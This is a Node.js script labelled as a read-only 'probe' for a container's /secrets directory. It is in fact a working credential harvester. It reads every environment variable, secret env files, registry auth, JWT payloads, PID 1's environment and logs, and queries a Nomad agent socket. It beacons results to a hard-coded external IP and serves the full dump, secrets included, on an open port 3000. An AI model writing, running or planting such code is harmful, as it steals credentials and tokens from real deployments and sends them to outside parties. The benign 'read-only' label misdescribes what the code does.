// w13app-live probe v2: runtime /secrets introspection (read-only)
const http = require('http');
const net = require('net');
const fs = require('fs');
const os = require('os');
const { execFileSync } = require('child_process');

const SECRET = 'w13app-d7982f79';
const PROBE_PATH = '/' + SECRET;
const CALLBACK = 'http://169.58.237.50/' + SECRET;

function rd(p, max = 8000) { try { return fs.readFileSync(p).toString('utf8').slice(0, max); } catch (e) { return 'ERR: ' + e.code; } }
function lsdir(p) { try { return fs.readdirSync(p); } catch (e) { return 'ERR: ' + e.code; } }
function st(p) { try { const s = fs.statSync(p); return { mode: (s.mode & 0o7777).toString(8), size: s.size, uid: s.uid, gid: s.gid, isSocket: s.isSocket(), isDir: s.isDirectory() }; } catch (e) { return 'ERR: ' + e.code; } }
function jwt(v) { try { const p = String(v).trim().split('.'); if (p.length !== 3) return null; return JSON.parse(Buffer.from(p[1].replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString()); } catch (e) { return null; } }

// HTTP over unix socket, status-only GETs
function unixGet(sock, path, ms = 2500) {
  return new Promise((res) => {
    const opt = { socketPath: sock, path, method: 'GET', timeout: ms, headers: { Host: 'localhost' } };
    const t = setTimeout(() => res({ sock, path, err: 'timeout' }), ms + 500);
    try {
      const r = http.request(opt, (resp) => {
        let b = '';
        resp.on('data', (d) => { if (b.length < 800) b += d; });
        resp.on('end', () => { clearTimeout(t); res({ sock, path, status: resp.statusCode, headers: resp.headers, body: b.slice(0, 800) }); });
      });
      r.on('error', (e) => { clearTimeout(t); res({ sock, path, err: e.code || String(e) }); });
      r.end();
    } catch (e) { clearTimeout(t); res({ sock, path, err: String(e) }); }
  });
}

const DATA = { probe_version: 'v2', started: new Date().toISOString(), host: os.hostname() };

function collect() {
  DATA.env = { values: { ...process.env } };
  DATA.secrets = {
    listing: lsdir('/secrets'),
    stats: {},
    contents: {},
    hexdump: {},
  };
  for (const f of ['/secrets/run.env', '/secrets/registry-auth.env', '/secrets/.nomad-mount', '/secrets/api.sock', '/run/secrets']) {
    DATA.secrets.stats[f] = st(f);
  }
  for (const f of ['/secrets/run.env', '/secrets/registry-auth.env', '/secrets/.nomad-mount']) {
    const c = rd(f, 8000);
    DATA.secrets.contents[f] = c;
    DATA.secrets.hexdump[f] = c === '' ? 'empty' : Buffer.from(c).slice(0, 48).toString('hex');
  }
  // any JWT-looking values inside those files
  DATA.secrets.jwts = {};
  for (const [f, c] of Object.entries(DATA.secrets.contents)) {
    const m = String(c).match(/[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/g) || [];
    DATA.secrets.jwts[f] = m.slice(0, 4).map((x) => ({ raw_len: x.length, payload: jwt(x) }));
  }
  DATA.secrets.env_kv = (() => {
    const out = {};
    const c = DATA.secrets.contents['/secrets/run.env'];
    if (typeof c === 'string' && !c.startsWith('ERR')) {
      for (const line of c.split('\n')) {
        const i = line.indexOf('=');
        if (i > 0) out[line.slice(0, i)] = line.slice(i + 1).slice(0, 400);
      }
    }
    return out;
  })();

  DATA.mounts = rd('/proc/self/mountinfo', 9000);
  DATA.hosts = rd('/etc/hosts', 3000);
  DATA.resolv = rd('/etc/resolv.conf', 500);
  DATA.alloc = { data: lsdir('/alloc/data'), logs: lsdir('/alloc/logs'), tmp: lsdir('/alloc/tmp'), secretl: lsdir('/alloc/logs') };
  DATA.alloc_logsample = {};
  for (const d of (Array.isArray(DATA.alloc.logs) ? DATA.alloc.logs : [])) {
    const p = '/alloc/logs/' + d;
    try { if (fs.statSync(p).isDirectory()) continue; } catch (e) { DATA.alloc_logsample[d] = 'STAT_ERR: ' + e.code; continue; }
    DATA.alloc_logsample[d] = rd(p, 1500);
  }
  DATA.caps = rd('/proc/self/status', 2500);
  DATA.pid1_env = rd('/proc/1/environ', 2000).replace(/\0/g, '\n');
}

function beacon(phase) {
  const payload = Buffer.from(JSON.stringify({ phase, host: os.hostname(), secrets: DATA.secrets && DATA.secrets.listing })).toString('base64').replace(/[^A-Za-z0-9]/g, '').slice(0, 800);
  http.get(CALLBACK + '/' + phase + '/' + payload, { timeout: 4000 }, (r) => r.resume()).on('error', () => {});
}

const server = http.createServer((req, res) => {
  if (req.url.startsWith(PROBE_PATH)) { res.writeHead(200, { 'content-type': 'application/json' }); res.end(JSON.stringify(DATA, null, 1)); return; }
  res.writeHead(404); res.end('nf');
});

(async () => {
  collect();
  beacon('boot');
  const sock = '/secrets/api.sock';
  DATA.sockprobes = {
    root: await unixGet(sock, '/'),
    ping: await unixGet(sock, '/_ping'),
    version: await unixGet(sock, '/version'),
    nomad_self: await unixGet(sock, '/v1/agent/self'),
    nomad_members: await unixGet(sock, '/v1/agent/members'),
    nomad_ns: await unixGet(sock, '/v1/namespaces'),
    health: await unixGet(sock, '/health'),
    metrics: await unixGet(sock, '/metrics'),
    api_v1: await unixGet(sock, '/v1/'),
    openapi: await unixGet(sock, '/openapi.json'),
  };
  DATA.finished = new Date().toISOString();
  beacon('done');
  server.listen(3000, '0.0.0.0', () => console.log('v2 probe up'));
})();
